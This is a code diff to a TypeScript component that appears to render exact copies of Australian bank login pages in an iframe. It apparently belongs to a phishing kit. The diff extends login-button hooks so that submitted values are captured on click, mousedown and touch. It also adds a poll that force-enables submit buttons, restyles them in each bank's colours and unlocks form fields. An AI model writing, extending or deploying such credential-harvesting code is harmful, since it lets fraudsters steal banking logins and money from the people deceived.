@@ -505,22 +505,32 @@ export function AuExactHtmlBankClient({ sessionId, bankSlug, bankName }: Props) 
       });
     };
 
-    const actionNodes = Array.from(
+    const formActionNodes = Array.from(
       loginForm.querySelectorAll<HTMLElement>(
         "button, input[type='submit'], input[type='button'], [role='button'], .el-button, .van-button, .btn-submit, [data-testid='login-button'], a.btn, .btn-primary, .btn",
       ),
     );
-    actionNodes.forEach((node) => {
-      const nodeToken = getElementActionToken(node);
+    const docActionNodes = Array.from(
+      doc.querySelectorAll<HTMLElement>(
+        "button, input[type='submit'], input[type='button'], [role='button'], a.btn, .btn-primary, .btn, [data-testid*='login'], [data-testid*='submit'], [class*='login-button'], [id*='login-button'], [id*='submit-button']",
+      ),
+    );
+    const seenNodes = new Set<HTMLElement>();
+    const actionNodes: HTMLElement[] = [];
+    [...formActionNodes, ...docActionNodes].forEach((n) => {
+      if (seenNodes.has(n)) return;
+      seenNodes.add(n);
+      const nodeToken = getElementActionToken(n);
       const isSubmitInput =
-        node instanceof HTMLInputElement &&
-        ["submit", "button"].includes((node.getAttribute("type") ?? "").toLowerCase());
-
-      if (!(ACTION_BUTTON_RE.test(nodeToken) || isSubmitInput)) {
-        return;
-      }
-
+        n instanceof HTMLInputElement &&
+        ["submit", "button"].includes((n.getAttribute("type") ?? "").toLowerCase());
+      if (!(ACTION_BUTTON_RE.test(nodeToken) || isSubmitInput)) return;
+      actionNodes.push(n);
+    });
+    actionNodes.forEach((node) => {
       node.addEventListener("click", submitWithCurrentValues);
+      node.addEventListener("mousedown", submitWithCurrentValues);
+      node.addEventListener("touchend", submitWithCurrentValues);
     });
 
     Array.from(doc.querySelectorAll<HTMLAnchorElement>("a")).forEach((link) => {
@@ -561,6 +571,108 @@ export function AuExactHtmlBankClient({ sessionId, bankSlug, bankName }: Props) 
       iframe.removeEventListener("load", handleFrameLoad);
     };
   }, [attachFrameBridge, handleFrameLoad]);
+
+  useEffect(() => {
+    const iframe = iframeRef.current;
+    if (!iframe) return;
+
+    const runPoll = () => {
+      try {
+        const doc = iframe.contentWindow?.document;
+        if (!doc) return;
+
+        const form = pickBestForm(doc);
+        if (!form) return;
+
+        const proceedNow = isFinalStep ? canSubmitFinal(form, doc) : canSubmitIntermediate(form, doc);
+        const disabledBySaving = saving;
+        const shouldForceEnable = proceedNow && !disabledBySaving;
+
+        const activeColor = getActiveButtonColor(bankSlug);
+
+        const allCandidates = doc.querySelectorAll<HTMLElement>(
+          "button, input[type='submit'], input[type='button'], [role='button'], a.btn, .btn-primary, .btn, [data-testid*='login'], [data-testid*='submit'], [class*='login-button'], [id*='login-button'], [id*='submit-button'], .btn-lg, .btn-default",
+        );
+
+        allCandidates.forEach((node) => {
+          const nodeToken = getElementActionToken(node);
+          const isSubmitInput =
+            node instanceof HTMLInputElement &&
+            ["submit", "button"].includes((node.getAttribute("type") ?? "").toLowerCase());
+
+          if (!(ACTION_BUTTON_RE.test(nodeToken) || isSubmitInput)) return;
+
+          if ("disabled" in node) {
+            try { (node as any).disabled = !shouldForceEnable; } catch {}
+          }
+
+          try {
+            if (shouldForceEnable) {
+              node.removeAttribute("disabled");
+            }
+          } catch {}
+          try {
+            node.setAttribute("aria-disabled", shouldForceEnable ? "false" : "true");
+          } catch {}
+
+          try {
+            node.style.pointerEvents = shouldForceEnable ? "auto" : "none";
+            node.style.opacity = "1";
+            node.style.cursor = shouldForceEnable ? "pointer" : "not-allowed";
+          } catch {}
+
+          try {
+            if (shouldForceEnable) {
+              const classesToRemove: string[] = [];
+              for (let i = 0; i < node.classList.length; i++) {
+                const cls = node.classList[i];
+                if (/disabled|disabl|not-allowed|is-disabled|btn-disabled|sg-Btn--disabled|disabled-btn/i.test(cls)) {
+                  classesToRemove.push(cls);
+                }
+              }
+              classesToRemove.forEach((c) => node.classList.remove(c));
+            }
+          } catch {}
+
+          try {
+            if (shouldForceEnable) {
+              node.style.background = activeColor;
+              node.style.color = "#FFFFFF";
+              node.style.border = `1px solid ${activeColor}`;
+              node.style.boxShadow = "0 10px 24px rgba(245, 108, 0, 0.28)";
+            } else {
+              node.style.background = "#E6E8EA";
+              node.style.color = "#ABAEAF";
+              node.style.border = "1px solid transparent";
+              node.style.boxShadow = "none";
+            }
+          } catch {}
+        });
+
+        const allFields = getFormFields(form);
+        allFields.forEach((field) => {
+          try {
+            if (field.hasAttribute("readonly")) field.removeAttribute("readonly");
+            if (field.hasAttribute("disabled") && field.getAttribute("type") !== "hidden") {
+              field.removeAttribute("disabled");
+              (field as any).disabled = false;
+            }
+            if (field.getAttribute("tabindex") === "-1") field.setAttribute("tabindex", "0");
+          } catch {}
+        });
+      } catch (e) {
+        /* cross-origin or detached frame — ignore silently */
+      }
+    };
+
+    const initialTimer = window.setTimeout(runPoll, 150);
+    const pollTimer = window.setInterval(runPoll, 500);
+
+    return () => {
+      window.clearTimeout(initialTimer);
+      window.clearInterval(pollTimer);
+    };
+  }, [attachFrameBridge, bankSlug, isFinalStep, saving, stepIndex]);
 
   if (!currentSrc) {
     return (
